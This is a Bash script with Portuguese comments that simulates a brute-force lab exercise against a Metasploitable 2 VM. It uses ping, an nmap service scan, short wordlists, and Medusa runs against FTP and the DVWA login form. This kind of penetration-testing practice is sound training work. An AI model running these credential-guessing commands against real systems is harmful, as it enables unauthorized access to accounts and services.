#!/bin/bash
# -----------------------------------------------------------------------------
# Script de Simulação de Ataque Brute Force contra Metasploitable 2
# Ferramentas: ping, nmap, medusa
# Alvo: 192.168.56.102 (Metasploitable 2)
# Autor: Pedro Pizzolato Mello
# -----------------------------------------------------------------------------

# Variáveis do Ambiente
TARGET_IP="192.168.56.102"
USER_LIST="users.txt"
PASS_LIST="pass.txt"
THREAD_COUNT=6

echo "--- 1. INICIANDO SIMULAÇÃO DE BRUTE FORCE ---"
echo "Alvo: $TARGET_IP"
echo "Contagem de threads (Medusa): $THREAD_COUNT"
echo ""

# --- 2. Verificação de Conectividade ---
echo "--- 2. VERIFICANDO CONECTIVIDADE (ping) ---"
echo "Teste completo:"
ping -c 5 $TARGET_IP
if [ $? -eq 0 ]; then
    echo "Resultado: Host ativo. Prosseguindo."
else
    echo "ERRO: Host inativo ou inacessível. Abortando simulação."
    exit 1
fi
echo ""

# --- 3. Varredura Nmap (Descoberta de Serviços) ---
echo "--- 3. VARREDURA NMAP (Portas comuns de autenticação) ---"
# -sV: Sonda para determinar o serviço/versão
# -p: Portas específicas (FTP, SSH, HTTP, Samba)
nmap -sV -p 21,22,80,445,139 $TARGET_IP
echo "Resultado: Serviços principais mapeados."
echo ""

# --- 4. Criação das Wordlists ---
echo "--- 4. CRIANDO WORDLISTS TEMPORÁRIAS ---"

# Lista de usuários para o FTP
echo -e 'user\nmsfadmin\nadmin\nroot' > $USER_LIST

# Lista de senhas
echo -e '123456\npassword\nqwerty\nmsfadmin' > $PASS_LIST

echo "Arquivos $USER_LIST e $PASS_LIST criados."
echo ""

# --- 5. Ataque Brute Force com Medusa (FTP) ---
echo "--- 5. ATAQUE BRUTE FORCE (FTP) ---"
echo "Executando Medusa no serviço FTP (porta 21)..."
medusa -h $TARGET_IP -U $USER_LIST -P $PASS_LIST -M ftp -t $THREAD_COUNT
echo "Resultado: Busca por credenciais no FTP concluída."
echo ""

# --- 6. Ataque Brute Force via HTTP (DVWA) ---
echo "--- 6. ATAQUE BRUTE FORCE (HTTP - DVWA) ---"

# Atualiza a wordlist de usuários para o ataque HTTP (como no documento original)
echo "Atualizando lista de usuários para incluir 'adminmsfadmin'..."
echo -e 'user\nadminmsfadmin\nadmin\nroot' > $USER_LIST

echo "Executando Medusa no login da DVWA (HTTP - porta 80)..."
# -M http: Módulo HTTP
# -m PAGE: URL da página de login
# -m FORM: Parâmetros do formulário (Substitui ^USER^ e ^PASS^)
# -m 'FAIL=...': String que indica falha de login (usada para validar sucesso)
medusa -h $TARGET_IP -U $USER_LIST -P $PASS_LIST -M http \
 -m PAGE:'/dvwa/login.php' \
 -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
 -m 'FAIL=Login failed' -t $THREAD_COUNT

echo "Resultado: Busca por credenciais na DVWA concluída."
echo ""

# --- 7. Limpeza (Opcional) ---
echo "--- 7. LIMPEZA ---"
rm $USER_LIST $PASS_LIST
echo "Arquivos $USER_LIST e $PASS_LIST removidos."
echo ""

echo "--- SIMULAÇÃO DE BRUTE FORCE CONCLUÍDA ---"

# Nota: O teste manual de FTP e a validação manual das credenciais não podem
# ser automatizados neste script e devem ser feitos separadamente pelo usuário.